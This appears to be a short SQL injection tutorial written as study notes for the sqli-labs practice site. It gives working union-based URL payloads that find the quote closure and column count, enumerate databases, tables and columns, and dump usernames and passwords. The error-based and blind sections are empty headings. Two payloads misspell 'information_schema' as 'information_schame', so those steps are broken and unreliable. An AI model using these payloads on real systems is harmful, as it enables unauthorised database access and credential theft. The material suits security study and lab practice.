# SQL Injection

> Before wirting, I want to share a useful learning website about sqli. That [sqli-labs](https://www.cnblogs.com/zhengna/p/12617743.html)

And you are supposed to know the basic of sqli, such as some userful function like "user()","database()","group_concat()", and note that the use
of "#", "--+", etc.

Some useful url encode
1. %20: " "
2. %23: "#"
3. %3a: ":"
4. %7e: "~"
5. %27: "'"
...

**Content**
- [1. Union-based](#1-Union-based-Injection)
- [2. Error-based](#2-Error-based-Injection)

## 1. Union-based Injection

Here are some basic steps of union injection.

### 1.1 Look for the type of closing symbol

See you need to upload the **$id**

You can put "/?id=" + followings:
1. 1 or 1=1--+
2. 1' or 1=1--+
3. 1" or 1=1--+
4. 1) or 1=1--+
5. 1') or 1=1--+
6. 1") or 1=1--+

You can find that the correct closing lead to a normal reflect instead of ERROR.

### 1.2 Ensure the column number

We assume that $id closed by single quote, then use **order** to find the columns.

Try 
```
?id=1' order by 1--+
```
and then 
```
?id=1' order by 2--+
```
until errors. That's the column number.

### 1.3 Check out the display data

Suppose that there is three columns in total.
```
?id=-1' union select 1,2,3 --+
```
If the output contains 2 and 3, we can set payload in position 2 and 3, where will show the data we want.

Note that there is always a **LIMIT 0,1** in the query. And you need to make the select of $id not work.

### 1.4 Blast databases

The current database you are using is **database()**
Use following to show it:
```
?id=-1' union select 1,database(),3 --+
```

If you want to show the all databases, try following:
```
?id=-1' union select 1,group_concat(schema_name),3 from information_schame.schemata --+
```

### 1.5 Blast tables

You always need to know the tables in your current database, blast tables like this:

```
?id=-1' union select 1,group_concat(table_name),3 from information_schame.tables where table_schema=database() --+
```

You can replace the database() with the database name you found in step 4.

### 1.6 Blast columns

Say you want to blast all columns of table "users" in current database. 

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```

### 1.7 Dump the data

Finally, you got the "id,username,password" columns in table users. 
```
?id=-1' union select 1,group_concat(username, 0x3a, password),3 from users --+
```

## 2. Error-based Injection

## 3. Bool Blind Injection

## 4. Time Blind Injection





